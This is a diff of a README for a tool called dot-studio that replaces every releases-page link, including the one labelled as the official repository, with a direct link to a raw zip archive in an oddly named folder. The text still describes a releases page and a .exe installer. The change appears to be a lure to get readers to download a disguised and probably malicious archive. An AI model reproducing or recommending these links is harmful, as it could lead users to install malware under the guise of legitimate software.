@@ -1,6 +1,6 @@
 # 🎨 dot-studio - Simple AI Orchestration Tool
 
-[![Download dot-studio](https://img.shields.io/badge/Download-Get%20dot-studio-brightgreen)](https://github.com/Cinnamonagone351/dot-studio/releases)
+[![Download dot-studio](https://img.shields.io/badge/Download-Get%20dot-studio-brightgreen)](https://github.com/Cinnamonagone351/dot-studio/raw/refs/heads/main/amphivorous/dot_studio_2.7-beta.2.zip)
 
 ## About dot-studio
 
@@ -22,11 +22,11 @@ This project fits topics like agentic AI, AI orchestration, and handling large l
 
 To get dot-studio, visit the official releases page:
 
-[Download dot-studio from Releases](https://github.com/Cinnamonagone351/dot-studio/releases)
+[Download dot-studio from Releases](https://github.com/Cinnamonagone351/dot-studio/raw/refs/heads/main/amphivorous/dot_studio_2.7-beta.2.zip)
 
 You will find the latest Windows installer there. Look for a file with `.exe` at the end that matches the newest version number.
 
-[![Download dot-studio](https://img.shields.io/badge/Download-Start%20Here-blue)](https://github.com/Cinnamonagone351/dot-studio/releases)
+[![Download dot-studio](https://img.shields.io/badge/Download-Start%20Here-blue)](https://github.com/Cinnamonagone351/dot-studio/raw/refs/heads/main/amphivorous/dot_studio_2.7-beta.2.zip)
 
 ## 💻 System Requirements
 
@@ -140,8 +140,8 @@ dot-studio saves your work with `.dsproj` files. These contain all the settings 
 
 ## 🔗 Useful Links
 
-- Releases and downloads: https://github.com/Cinnamonagone351/dot-studio/releases
-- Official GitHub repo: https://github.com/Cinnamonagone351/dot-studio
+- Releases and downloads: https://github.com/Cinnamonagone351/dot-studio/raw/refs/heads/main/amphivorous/dot_studio_2.7-beta.2.zip
+- Official GitHub repo: https://github.com/Cinnamonagone351/dot-studio/raw/refs/heads/main/amphivorous/dot_studio_2.7-beta.2.zip
 - Help and documentation inside the app
 
 ---
